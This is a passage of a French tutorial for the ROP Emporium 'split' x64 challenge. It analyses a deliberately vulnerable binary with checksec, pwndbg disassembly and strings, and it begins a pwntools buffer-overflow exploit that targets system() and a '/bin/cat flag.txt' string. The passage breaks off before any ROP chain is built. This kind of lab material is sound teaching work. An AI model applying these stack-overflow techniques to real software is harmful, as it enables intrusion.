<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">split</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">split</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">98755e64e1d0c1bff48fccae1dca9ee9e3c609e2</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/split_x64/split&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Cette fois-ci, <strong>NX</strong> est activé, ce qui veut dire qu&rsquo;on ne pourra pas utiliser de shellcode.</p>
<h2 id="exploitation">Exploitation</h2>
<p>On va run l&rsquo;executable et voir ce qu&rsquo;il se passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212481259-21f15103-f1f5-4ce5-a4e6-5a89b7f34acf.png" alt="2023-01-14-140834_657x666_scrot"></p>
<p>Contrairement au précédent, il ne nous donne aucune information sur son fonctionnement. En revanche, on voit que si on entre un nombre de bytes élevé dans l&rsquo;input, il  <code>segfault</code>, ce qui veut dire qu&rsquo;on a commencé à réecrire la sauvegarde de <code>rip</code></p>
<p>C&rsquo;est bon signe, on a déjà trouvé notre point d&rsquo;entrée. On va maintenant désassembler l&rsquo;executable avec <code>pwndbg</code> pour essayer de comprendre plus en détail ce qu&rsquo;il fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400697</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400698</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2009d6</span>]        <span style="color:#75715e"># 0x601078 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:  mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ac</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4005a0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4007e8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4007fe</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006c8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006e8</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400806</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006dc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit que le main fait appel à une fonction appelée <code>pwnme</code>, on va la désassembler elle aussi et voir ce qu&rsquo;elle fait</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006e9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006ec</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400701</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400580</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400706</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400810</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040070b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400710</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x40083c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400715</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400570</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400735</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x40083f</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400550</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040073f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400740</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:  leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400741</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On peut voir qu&rsquo;il lit 96 (0x60) bytes d&rsquo;input via la fonction <code>read()</code>, et qu&rsquo;il les stocke dans un buffer de 32 (0x20) bytes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040071f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400723</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x60</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400728</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040072b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400730</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400590</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Voici donc à quoi va ressembler le début de notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./split&#39;</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(padding <span style="color:#f92672">+</span> rbp)
</span></span></code></pre></div><p>Evidemment, cet exploit ne fait rien, mais nous savons déjà quelle taille notre padding va faire, et on peut à présent réecrire la sauvegarde de <code>rip</code>. La prochaine étape est de savoir quoi mettre dans ce registre, on va commencer par chercher si il y a des fonctions intéressantes (toujours avec <code>pwndbg</code>)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400528</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  system<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400570</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400580</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005a0</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005b0</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e0</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005f0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400620</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400660</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400697</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e8</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400742</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d4</span>  _fini
</span></span></code></pre></div><p>On voit une fonction <code>usefulFunction</code> située à <code>0x00400742</code>. Voyons ce qu&rsquo;elle fait en la désassemblant:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass usefulFunction
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function usefulFunction:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400742</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400743</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400746</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    edi,<span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040074b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>: call   <span style="color:#ae81ff">0x400560</span> <span style="color:#f92672">&lt;</span>system<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400750</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">14</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400751</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400752</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Elle fait donc appel à <code>system</code>, en lui passant un argument situé à l&rsquo;adresse <code>0x40084a</code>, voyons voir à quoi elle correspond</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>s <span style="color:#ae81ff">0x40084a</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x40084a</span>: <span style="color:#e6db74">&#34;/bin/ls&#34;</span>
</span></span></code></pre></div><p>Cette fonction va donc éxecuter la commande <code>ls</code> via <code>system</code>, pas très utile&hellip; En revanche, on va pouvoir utiliser l&rsquo;adresse de l&rsquo;appel de la fonction <code>system</code> plus tard, alors gardons la de côté (<code>0x0040074b</code>)</p>
<p>Maintenant qu&rsquo;on va pouvoir appeller system, il faut trouver un string qu&rsquo;on va lui donner en argument, de préférence soit un <code>/bin/sh</code> pour avoir un shell, ou un <code>/bin/cat flag.txt</code> pour directement lire le flag. Regardons la liste des strings de l&rsquo;executable</p>
<pre tabindex="0"><code>strings -t x split                                                                                                       ✔ ╱ took 6s  ╱ at 15:21:31  
    238 /lib64/ld-linux-x86-64.so.2
    3b1 libc.so.6
    3bb puts
    3c0 printf
    3c7 memset
    3ce read
    3d3 stdout
    3da system
    3e1 setvbuf
    3e9 __libc_start_main
    3fb GLIBC_2.2.5
    407 __gmon_start__
    760 AWAVI
    767 AUATL
    7ba []A\A]A^A_
    7e8 split by ROP Emporium
    7fe x86_64
    807 Exiting
    810 Contriving a reason to ask user for data...
    83f Thank you!
    84a /bin/ls
    917 ;*3$&#34;
   1060 /bin/cat flag.txt
   1072 GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
   1731 crtstuff.c
   173c deregister_tm_clones
   1751 __do_global_dtors_aux
   1767 completed.7698
   1776 __do_global_dtors_aux_fini_array_entry
   179d frame_dummy
   17a9 __frame_dummy_init_array_entry
   17c8 split.c
   17d0 pwnme
   17d6 usefulFunction
   17e5 __FRAME_END__
   17f3 __init_array_end
   1804 _DYNAMIC
   180d __init_array_start
   1820 __GNU_EH_FRAME_HDR
   1833 _GLOBAL_OFFSET_TABLE_
   1849 __libc_csu_fini
   1859 stdout@@GLIBC_2.2.5
   186d puts@@GLIBC_2.2.5
   187f _edata
   1886 system@@GLIBC_2.2.5
   189a printf@@GLIBC_2.2.5
   18ae memset@@GLIBC_2.2.5
   18c2 read@@GLIBC_2.2.5
   18d4 __libc_start_main@@GLIBC_2.2.5
   18f3 __data_start
   1900 __gmon_start__
   190f __dso_handle
   191c _IO_stdin_used
   192b usefulString
   1938 __libc_csu_init
   1948 _dl_relocate_static_pie
   1960 __bss_start
   196c main
   1971 setvbuf@@GLIBC_2.2.5
   1986 __TMC_END__
   1993 .symtab
   199b .strtab
   19a3 .shstrtab
   19ad .interp
   19b5 .note.ABI-tag
   19c3 .note.gnu.build-id
   19d6 .gnu.hash
   19e0 .dynsym
   19e8 .dynstr
   19f0 .gnu.version
   19fd .gnu.version_r
   1a0c .rela.dyn
   1a16 .rela.plt
   1a20 .init
   1a26 .text
   1a2c .fini
   1a32 .rodata
   1a3a .eh_frame_hdr
   1a48 .eh_frame
   1a52 .init_array
   1a5e .fini_array
   1a6a .dynamic
   1a73 .got
   1a78 .got.plt
   1a81 .data
   1a87 .bss
   1a8c .comment
</code></pre><p>On voit un <code>/bin/cat flag.txt</code> situé à l&rsquo;offset <code>1060</code>. C&rsquo;est le string qu&rsquo;on va passer comme argument à <code>system</code>, mais pour ça, il va nous falloir son adresse. Puisque c&rsquo;est un string, il est situé dans la section <code>.data</code>. Essayons de trouver où elle se situe avec <code>pwndbg</code>. Pour ce faire, on peut utiliser la commande <code>readelf</code>, puis grep <code>.data</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>s split <span style="color:#f92672">|</span> grep <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">00000000004007e0</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">15</span> <span style="color:#f92672">.</span>rodata
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">23</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> SECTION LOCAL  DEFAULT   <span style="color:#ae81ff">23</span> <span style="color:#f92672">.</span>data
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">47</span>: <span style="color:#ae81ff">0000000000601050</span>     <span style="color:#ae81ff">0</span> NOTYPE  WEAK   DEFAULT   <span style="color:#ae81ff">23</span> data_start
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">49</span>: <span style="color:#ae81ff">0000000000601072</span>     <span style="color:#ae81ff">0</span> NOTYPE  GLOBAL DEFAULT   <span style="color:#ae81ff">23</span> _edata
